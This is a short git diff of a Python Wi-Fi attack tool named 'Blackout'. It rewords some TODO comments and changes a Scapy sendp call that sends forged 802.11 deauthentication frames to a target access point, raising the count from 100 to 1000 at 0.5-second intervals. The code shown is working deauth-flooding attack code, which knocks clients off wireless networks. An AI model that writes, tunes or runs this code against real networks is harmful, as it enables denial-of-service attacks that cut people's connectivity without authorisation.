@@ -235,7 +235,7 @@ class Blackout:
             self.start_sniff(phase='ap')
         
             # Wait for user to end AP sniffing phase
-            # TODO: This feels too hacky, fix this
+            # TODO: This seems very inelegant, fix this
             while self.ap_update_event.is_set():
                 pass
 
@@ -289,8 +289,6 @@ class Blackout:
     def deauth(self, bssid, channel, target):
         """
         create deauth packets and send them to the target AP
-        TODO:
-        Allow multiple targets, including clients aswell as AP's
         """
 
         if target is BROADCAST_ADDR:
@@ -307,12 +305,12 @@ class Blackout:
             deauth_pkt = RadioTap() / dot11 / Dot11Deauth(reason=7)
 
             # send it
-            # I don't think you're really supposed to use a for loop for this,
+            # TODO: Use of a for loop for this is unconvential,
             # instead use the count argument to set number of packets. However,
-            # I found this to be more reliable.
+            # for now I found this to be more reliable.
             try:
                 #while True:
-                sendp(deauth_pkt, inter=0.1, count=100, iface=conf.iface)
+                sendp(deauth_pkt, inter=0.5, count=1000, iface=conf.iface)
 
             # except KeyboardInterrupt:
             #     print("[*] Keyboard Interrupt\n")
